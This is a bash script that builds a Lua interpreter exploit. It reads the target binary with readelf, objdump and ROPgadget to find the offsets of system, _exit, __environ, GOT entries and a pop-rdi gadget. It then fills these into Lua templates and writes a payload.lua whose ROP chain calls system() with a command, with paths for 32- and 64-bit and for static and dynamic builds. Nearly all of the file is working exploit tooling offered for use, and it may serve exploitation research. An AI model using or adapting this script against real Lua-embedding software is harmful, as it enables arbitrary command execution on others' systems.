#!/bin/bash

set -ueE
die() { printf 'failed\n'; exit 1; }
trap die ERR

binpath="$1"

if [[ "$binpath" == "" ]]; then
    echo "please provide path to Lua interpreter as argument"
    exit 1
fi

map_to_sed() {
    declare -n map="$1"
    for key in "${!map[@]}"; do
        val="${map[$key]}"
        if [[ "$val" == "0x" ]]; then
            echo "$key is unpopulated; please fill in manually" > /dev/stderr
            exit 1
        fi
        printf 's/%s/%s/g;' "$key" "$val"
    done
}

# get offset of a symbol within an image
get_symbol() {
    file_path="$1"
    symbol_type="$2"
    symbol_name="$3"
    printf '0x%s' $(readelf -sW "$file_path" | grep -m1 "$symbol_type *[A-Z]* *[A-Z]* *[0-9]* *$symbol_name" | awk '{print $2}' | sed -E 's/^0*(.)/\1/')
}

# get offset of a relocation entry within an image
get_reloc() {
    file_path="$1"
    symbol_name="$2"
    printf '0x%s' $(readelf -rW "$file_path" | grep -m1 " $symbol_name" | awk '{print $1}' | sed -E 's/^0*(.)/\1/')
}

declare -A template

template[OVERWRITTEN_RET_OFF]=0x$(objdump -d "$binpath" | grep -A2 'call.*lua_pcallk' | tr -d '\n' | sed 's/--/\n/g' | grep 0xffffffff | cut -d: -f2 | grep -o '[0-9a-f]*$')
template[POP_RDI_RET_OFF]=$(ROPgadget --binary "$binpath" --opcode 5fc3 | grep : | head -n1 | awk '{print $1}' | sed 's/^0x0*/0x/')

if readelf -d "$binpath" | grep -q 'There is no dynamic section in this file'; then
    # statically linked
    template_file='static.lua'

    # for ROP
    template[STRING_LOWER_OFF]=$(get_symbol "$binpath" FUNC str_lower)
    template[ENVIRON_OFF]=$(get_symbol "$binpath" OBJECT __environ)
    template[SYSTEM_OFF]=$(get_symbol "$binpath" FUNC system)
    template[EXIT_OFF]=$(get_symbol "$binpath" FUNC _exit)
elif ldd "$binpath" | grep -q liblua; then
    # dynamically linked, liblua.so
    template_file='dynamic_liblua.lua'
    libc_path=$(ldd "$binpath" | grep libc.so | awk '{print $3}')
    liblua_path=$(ldd "$binpath" | grep liblua | awk '{print $3}')

    # for ROP
    template[STRING_LOWER_OFF]=$(get_symbol "$liblua_path" FUNC str_lower)
    template[TOLOWER_GOT_PLT_OFF]=$(get_reloc "$liblua_path" __ctype_tolower_loc)
    template[TOLOWER_OFF]=$(get_symbol "$libc_path" FUNC  __ctype_tolower_loc)
    template[SYSTEM_OFF]=$(get_symbol "$libc_path" FUNC system)
    template[EXIT_OFF]=$(get_symbol "$libc_path" FUNC _exit)
    template[ENVIRON_GOT_OFF]=$(get_reloc "$libc_path" __environ)
    template[POP_RDI_RET_OFF]=$(ROPgadget --binary "$liblua_path" --opcode 5fc3 | grep : | head -n1 | awk '{print $1}' | sed 's/^0x0*/0x/')
    template[OVERWRITTEN_RET_OFF]=0x$(objdump --disassemble=lua_pcallk "$liblua_path" | grep 'test.*%ebp,%ebp' | awk '{print $1}' | sed 's/^0*//' | tr -d :)
else
    # dynamically linked, liblua.a
    template_file='dynamic.lua'
    libc_path=$(ldd "$binpath" | grep libc.so | awk '{print $3}')

    # for ROP
    template[STRING_LOWER_OFF]=$(get_symbol "$binpath" FUNC str_lower)
    template[TOLOWER_GOT_PLT_OFF]=$(get_reloc "$binpath" __ctype_tolower_loc)
    template[TOLOWER_OFF]=$(get_symbol "$libc_path" FUNC  __ctype_tolower_loc)
    template[SYSTEM_OFF]=$(get_symbol "$libc_path" FUNC system)
    template[EXIT_OFF]=$(get_symbol "$libc_path" FUNC _exit)
    template[ENVIRON_GOT_OFF]=$(get_reloc "$libc_path" __environ)

    # for GOT overwrite
    template[MATH_LDEXP_OFF]=$(get_symbol "$binpath" FUNC math_ldexp)
    template[LDEXP_GOT_PLT_OFF]=$(get_reloc "$binpath" ldexp)
fi

if [[ $(readelf -h "$binpath" | grep Class | awk '{print $2}' | tr -d ELF) == 64 ]]; then
    # 64-bit

    # sizeof(size_t)
    template[PTRSIZE]=8
    # offset of TString.u.lnglen
    template[STRING_LEN_OFF]=16
    # offset of TString.contents
    template[TSTRING_CONTENTS_OFF]=24
    # offset of LClosure.p
    template[LCLOSURE_P_OFF]=24
    # offset of Proto.k
    template[PROTO_K_OFF]=56
    # offset of UpVal.v.p
    template[UPVAL_VALUE_OFF]=16
    # ROP chain payload
    template[PAYLOAD]='string.pack(string.rep("I8", 8), pop_rdi_ret, command_ptr, ret, system_addr, pop_rdi_ret, 0, ret, exit)'
else
    # 32-bit

    # see 64-bit section for definitions
    template[PTRSIZE]=4
    template[STRING_LEN_OFF]=12
    template[TSTRING_CONTENTS_OFF]=16
    template[LCLOSURE_P_OFF]=12
    template[PROTO_K_OFF]=48
    template[UPVAL_VALUE_OFF]=8
    template[PAYLOAD]='string.pack(string.rep("I4", 5), system_addr, pop_rdi_ret, command_ptr, exit, 0)'
fi

# handle 1-indexing
template[STRING_LEN_OFF]=$((template[STRING_LEN_OFF] + template[PTRSIZE]))
template[PTRMIN1]=$((template[PTRSIZE] - 1))

# fill in anything missing here, e.g
#template[MATH_LDEXP_OFF]=0x2a710
#template[STRING_LOWER_OFF]=0x2da60

sed_pattern="$(map_to_sed template)"
cat base.lua "$template_file" | sed "$sed_pattern" > payload.lua
